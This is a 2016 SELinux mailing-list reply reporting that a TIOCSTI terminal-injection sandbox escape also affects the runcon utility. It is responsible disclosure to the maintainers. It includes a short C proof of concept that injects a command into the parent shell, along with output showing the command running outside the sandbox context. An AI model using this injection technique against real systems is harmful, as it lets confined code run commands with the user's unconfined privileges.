Message-ID: <20160924115740.18196b6yz71zn4kc@webmail.alunos.dcc.fc.up.pt>
Date: Sat, 24 Sep 2016 11:57:40 +0200
From: up201407890@alunos.dcc.fc.up.pt
To: "Stephen Smalley" <sds@tycho.nsa.gov>
Cc: selinux@tycho.nsa.gov, "Paul Moore" <paul@paul-moore.com>
Subject: Re: SELinux sandbox escape via TIOCSTI ioctl
References: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
 <e6efcd0b-27cd-de33-d111-bc2bcb1dc0b1@tycho.nsa.gov>
In-Reply-To: <e6efcd0b-27cd-de33-d111-bc2bcb1dc0b1@tycho.nsa.gov>
MIME-Version: 1.0
Content-Type: text/plain;
	charset=UTF-8;
	DelSp="Yes";
	format="flowed"
List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
 <selinux.tycho.nsa.gov>
List-Post: <mailto:selinux@tycho.nsa.gov>
List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>

Quoting "Stephen Smalley" <sds@tycho.nsa.gov>:

> Thank you for the bug report. This bug is now fixed in upstream commit
> acca96a135a4d2a028ba9b636886af99c0915379.

Cool, thanks. Though it'll lose job control, that's why most 'su-like'  
programs refuse to patch this and are still vulnerable.

Anyways, the same happens with the 'runcon' utility:

$ cat test.c
#include <unistd.h>
#include <sys/ioctl.h>

int main()
{
   char *cmd = "id\n";
   while(*cmd)
    ioctl(0, TIOCSTI, cmd++);
   execlp("/bin/id", "id", NULL);
}
$ gcc test.c -o test
$ runcon -t sandbox_t ./test
id
uid=1000 gid=1000 groups=1000  
context=unconfined_u:unconfined_r:sandbox_t:s0-s0:c0.c1023
$ id
uid=1000(saken) gid=1000(saken) groups=1000(saken)  
context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

Should it be also patched there?

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.
